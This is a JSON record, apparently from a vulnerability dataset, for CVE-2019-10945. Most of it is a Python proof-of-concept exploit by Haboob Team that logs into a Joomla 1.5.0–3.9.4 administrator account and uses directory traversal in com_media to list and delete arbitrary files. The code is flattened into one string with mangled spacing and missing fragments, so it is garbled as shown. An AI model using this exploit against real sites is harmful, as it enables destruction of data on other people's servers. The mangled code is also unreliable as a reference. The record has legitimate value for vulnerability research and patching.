{
    "text": "vul_name : Joomla 3.9.4 Arbitrary File Deletion / Directory Traversal ， vul_cve : CVE-2019-10945 ， vul_poc :  # Exploit Title : Joomla Core ( 1.5.0 through 3.9.4 ) - Directory Traversal Authenticated Arbitrary File Deletion ，  # Date : 2019-March-13 ，  # Exploit Author : Haboob Team ，  # Web Site : haboob.sa ，  # Email : research @ haboob.sa ，  # Software Link :  ，  # Versions : Joomla 1.5.0 through Joomla 3.9.4 ，  # CVE : CVE-2019-10945 ，  # Usage :  ，  # List files in the specified directory :  ，  # python exploit.py -url= -username=<joomla-manager-username> -password=<joomla-manager-password> -dir=<directory name> ，  # Delete file in specified directory ，  # python exploit.py -url= -username=<joomla-manager-username> -password=<joomla-manager-password> -dir=<directory to list> -rm=<file name> ， print ( \"module 'click' doesn't exist , type : pip install click\" )  ， exit ( 0 )  ， print ( \"module 'requests' doesn't exist , type : pip install requests\" )  ， exit ( 0 )  ， print ( \"module 'lxml' doesn't exist , type : pip install lxml\" )  ， exit ( 0 )  ， mediaList = \"?option=com_media&view=mediaList&tmpl=component&folder=/.\" ， print ' ，  # Exploit Title : Joomla Core ( 1.5.0 through 3.9.4 ) - Directory Traversal Authenticated Arbitrary File Deletion ，  # Web Site : Haboob.sa ，  # Email : research @ haboob.sa ，  # Versions : Joomla 1.5.0 through Joomla 3.9.4 ， _ _ _ _ _ _ ，  |  |  |  | /\\ | _ \\ / _ \\ / _ \\ | _ \\ ，  |  | _ |  | / \\ |  | _ )  |  |  |  |  |  |  |  | _ )  |  ，  | _ | / /\\ \\ | _ < |  |  |  |  |  |  | _ < ，  |  |  |  | / _ \\ |  | _ )  |  | _ |  |  | _ |  |  | _ )  |  ，  | _ |  | _/_/ \\_\\_/ \\_/ \\_/ | _/ ， ' ， class URL ( click.ParamType )  :  ， name = 'url' ， regex = re.compile (  ， r'^ ( ? : http ) s? : /' # http : / or https : / ， r' ( ? :  ( ? :  [ A-Z0-9 ]  ( ? :  [ A-Z0-9- ] {0 , 61} [ A-Z0-9 ]  ) ?\\. ) + ( ? :  [ A-Z ] {2 , 6}\\.? |  [ A-Z0-9- ] {2 , }\\.? )  | ' # domain. ， r'localhost | ' # localhost. ， r'\\d{1 , 3}\\.\\d{1 , 3}\\.\\d{1 , 3}\\.\\d{1 , 3} ) ' # .or ip ， r' ( ? : \\d+ ) ?' # optional port ， r' ( ? : /? |  [ /? ] \\S+ )  $ ' , re.IGNORECASE )  ， self.fail ( 'invalid URL ( %s ) ' % value , param , ctx )  ， r = requests.get ( url , cookies=cookie , timeout=5 )  ， print ( \"invalid URL : 404 NOT FOUND ! \" )  ， exit ( 0 )  ， page = r.text.encode ( 'utf-8' )  ， html = lxml.html.fromstring ( page )  ， csrf , cookie = getForm ( url , '/input/ @ name' )  ， postData = {'username' : username , 'passwd' : password , 'option' : 'com_login' , 'task' : 'login' ,  ， 'return' : 'aW5kZXgucGhw' , csrf [ -1 ]  : 1} ， res = requests.post ( url , cookies=cookie.get_dict (  )  , data=postData , allow_redirects=False )  ， html = lxml.html.fromstring ( res.text )  ， msg = html.xpath ( \"/div [  @ class='alert-message' ] /text (  )  [ 1 ] \" )  ， print msg ， exit (  )  ， get_cookies ( res.cookies.get_dict (  )  , url , username , password )  ， with open ( filename , 'wb' ) as f :  ， pickle.dump ( requests_cookiejar , f )  ， with open ( filename , 'rb' ) as f :  ， result = hashlib.md5 ( str ( url ) + str ( username ) + str ( password )  ， _dir = tempfile.gettempdir (  )  ， cookie_file = cookies_file_name ( url , username , password )  ， save_cookies ( req_cookie , cookie_file )  ， cookie = get_cookies ( ' , url , username , password )  ， url = url + mediaList + dir ， files , cookie = getForm ( url , \"/input [  @ name='rm [  ] ' ] / @ value\" , cookie )  ， print file ， pass ， cookie = get_cookies ( ' , baseurl , username , password )  ， url = baseurl + mediaList + dir ， link , _cookie = getForm ( url , \"/a [  @ target='_top' ] / @ href\" , cookie )  ， link = urllib.unquote ( link [ 0 ] .encode ( \"utf8\" )  ， link = link.split ( 'folder=' )  [ 0 ]  ， link = link.replace ( \"folder.delete\" , \"file.delete\" )  ， link = baseurl + link + \"folder=/.\" + dir + \"&rm [  ] =\" + file ， msg , cookie = getForm ( link , \"/div [  @ class='alert-message' ] /text (  )  [ 1 ] \" , cookie )  ， print \"ERROR : File does not exist\" ， print msg ， print \"ERROR : 404 NOT FOUND ! \" ，  @ click.group ( invoke_without_command=True )  ，  @ click.option ( '-url' , type=URL (  )  , help=\"Joomla Administrator URL\" , required=True )  ，  @ click.option ( '-username' , type=str , help=\"Joomla Manager username\" , required=True )  ，  @ click.option ( '-password' , type=str , help=\"Joomla Manager password\" , required=True )  ，  @ click.option ( '-dir' , type=str , help=\"listing directory\" )  ，  @ click.option ( '-rm' , type=str , help=\"delete file\" )  ，  @ click.pass_context ， url = url+\"/\" ， cookie_file = cookies_file_name ( url , username , password )  ， login ( url , username , password )  ， dir = dir.lstrip ( '/' )  ， dir = dir.rstrip ( '/' )  ， dir = \"/\" + dir ， dir = ' ， dir = ' ， print dir ， removeFile ( url , username , password , dir , rm )  ， traversal ( url , username , password , dir )  ， cli (  ) ",
    "time": "2019.04.17"
}